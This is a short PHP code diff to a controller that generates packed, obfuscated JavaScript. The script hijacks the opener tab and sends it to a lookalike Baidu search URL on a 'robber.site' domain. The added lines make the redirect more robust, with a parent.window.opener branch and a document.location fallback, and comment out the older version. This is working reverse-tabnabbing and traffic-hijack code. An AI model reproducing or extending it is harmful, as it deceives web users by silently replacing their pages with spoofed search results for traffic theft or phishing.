@@ -16,7 +16,12 @@ class JsController extends Controller
     		return view('js', ['js' => '请设置站点<a href="'. url('/website/'. $website->id .'/keyword') .'">关键词</a>']);
     	}
 
-        $js = 'window.opener.location = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";';
+        $js = 'if(parent.window.opener){
+            parent.window.opener.location = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";
+        } else {
+            window.opener.document.location.href = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";
+        }';
+        // $js = 'window.opener.location = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";';
 
 		$packer = new JavaScriptPacker($js, 'Normal', true, false);
 		$packed = $packer->pack();
